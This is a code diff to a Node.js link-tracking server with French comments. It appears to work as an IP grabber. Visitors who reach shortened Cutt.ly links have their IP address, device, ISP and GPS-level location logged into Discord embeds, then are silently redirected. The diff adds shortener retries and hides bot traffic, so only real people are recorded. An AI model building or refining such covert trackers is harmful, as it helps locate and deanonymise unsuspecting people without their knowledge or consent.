@@ -36,28 +36,28 @@ const maxmind = require('maxmind');
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-// Fonction pour raccourcir via Cutt.ly
-async function shortenWithCuttly(longUrl, suffix) {
-  try {
-    const response = await axios.get('https://cutt.ly/api/api.php', {
-      params: {
-        key: CUTTLY_API_KEY,
-        short: longUrl,
-        name: suffix
-      }
-    });
+// Fonction de raccourcissement Cutt.ly avec 3 essais
+async function shortenWithCuttly(longUrl, baseSuffix) {
+  for (let i = 0; i <= 3; i++) {
+    let suffix = i === 0 ? baseSuffix : `${baseSuffix}-${i}`;
+    try {
+      const response = await axios.get('https://cutt.ly/api/api.php', {
+        params: {
+          key: CUTTLY_API_KEY,
+          short: longUrl,
+          name: suffix
+        }
+      });
 
-    const data = response.data;
-    if (data.url.status === 7) {
-      return data.url.shortLink;
-    } else {
-      console.error("Erreur Cutt.ly :", data.url.title);
-      return null;
+      const data = response.data;
+      if (data.url.status === 7) {
+        return data.url.shortLink;
+      }
+    } catch (err) {
+      console.error(`Erreur Cutt.ly (essai ${i}) :`, err.response?.data || err.message);
     }
-  } catch (err) {
-    console.error("Erreur Cutt.ly API :", err.message);
-    return null;
   }
+  return null;
 }
 
 // Fonction commune pour envoyer un embed IP
@@ -69,6 +69,16 @@ async function logIp(req, res, redirectUrl = null) {
   const ip = rawIp.split(',')[0].trim();
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
+
+  // Ignore les bots et "Inconnu-Inconnu"
+  if (!device.client?.name && !device.os?.name) {
+    console.log(`⛔ Ignoré - Appareil inconnu pour IP ${ip}`);
+    if (redirectUrl) {
+      return res.redirect(redirectUrl);
+    } else {
+      return res.status(204).send();
+    }
+  }
 
   let geo = {};
   let bigdata = {};
@@ -89,10 +99,8 @@ async function logIp(req, res, redirectUrl = null) {
     ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
     : '❌ Introuvable';
 
-  const isBot = !userAgent || /bot|crawler|discord|cloudflare/i.test(userAgent);
-
   const embed = new EmbedBuilder()
-    .setTitle(isBot ? '⚙️ Scan automatique détecté' : '📥 Nouvelle connexion détectée')
+    .setTitle('📥 Nouvelle connexion détectée')
     .addFields(
       { name: 'IP', value: `\`${ip}\`` },
       { name: 'Appareil', value: `${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}` },
@@ -103,7 +111,7 @@ async function logIp(req, res, redirectUrl = null) {
       { name: 'FAI', value: geo?.traits?.isp || '❌ Introuvable', inline: true },
       { name: 'Localisation GPS', value: coordsField }
     )
-    .setColor(isBot ? 0x808080 : 0x00AE86)
+    .setColor(0x00AE86)
     .setTimestamp();
 
   try {
